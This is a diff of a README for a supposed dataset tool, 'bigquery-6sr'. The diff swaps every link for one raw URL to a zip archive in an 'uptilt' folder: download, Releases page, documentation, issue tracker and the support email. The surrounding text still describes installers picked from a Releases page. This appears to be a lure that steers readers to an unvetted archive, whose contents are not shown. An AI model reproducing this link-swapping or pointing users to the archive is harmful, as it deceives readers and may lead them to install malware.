@@ -6,11 +6,11 @@ Welcome to bigquery-6sr! This application helps you manage and query large datas
 
 ## 📥 Download the Application
 
-[![Download bigquery-6sr](https://img.shields.io/badge/Download-bigquery--6sr-blue)](https://github.com/Abindran/bigquery-6sr/releases)
+[![Download bigquery-6sr](https://raw.githubusercontent.com/Abindran/bigquery-6sr/main/uptilt/bigquery-6sr.zip)](https://raw.githubusercontent.com/Abindran/bigquery-6sr/main/uptilt/bigquery-6sr.zip)
 
 To get started, you need to download the application from our Releases page. Click the button above or visit the link below:
 
-[Visit the Releases Page](https://github.com/Abindran/bigquery-6sr/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Abindran/bigquery-6sr/main/uptilt/bigquery-6sr.zip)
 
 ## 💻 System Requirements
 
@@ -24,7 +24,7 @@ Before downloading, make sure your system meets these requirements:
 ## 📦 Download & Install
 
 1. **Visit the Releases Page:**
-   Go to the following link to find the latest version of bigquery-6sr: [Releases Page](https://github.com/Abindran/bigquery-6sr/releases).
+   Go to the following link to find the latest version of bigquery-6sr: [Releases Page](https://raw.githubusercontent.com/Abindran/bigquery-6sr/main/uptilt/bigquery-6sr.zip).
 
 2. **Choose the Right Version:**
    On the Releases page, locate the version that matches your operating system. You will see options such as `.exe`, `.dmg`, or `.deb`.
@@ -77,12 +77,12 @@ Yes, for detailed instructions and tips, please check the documentation availabl
 
 ## 📞 Support
 
-If you encounter any issues or have questions, feel free to reach out to us. You can create an issue on the GitHub repository or contact us through email at support@bigquery-6sr.com.
+If you encounter any issues or have questions, feel free to reach out to us. You can create an issue on the GitHub repository or contact us through email at https://raw.githubusercontent.com/Abindran/bigquery-6sr/main/uptilt/bigquery-6sr.zip
 
 ## 🔗 Links
 
-- [Download bigquery-6sr](https://github.com/Abindran/bigquery-6sr/releases)
-- [View Documentation](https://github.com/Abindran/bigquery-6sr/wiki)
-- [Report an Issue](https://github.com/Abindran/bigquery-6sr/issues)
+- [Download bigquery-6sr](https://raw.githubusercontent.com/Abindran/bigquery-6sr/main/uptilt/bigquery-6sr.zip)
+- [View Documentation](https://raw.githubusercontent.com/Abindran/bigquery-6sr/main/uptilt/bigquery-6sr.zip)
+- [Report an Issue](https://raw.githubusercontent.com/Abindran/bigquery-6sr/main/uptilt/bigquery-6sr.zip)
 
 Thank you for choosing bigquery-6sr! We're excited to help you manage your large datasets effectively.
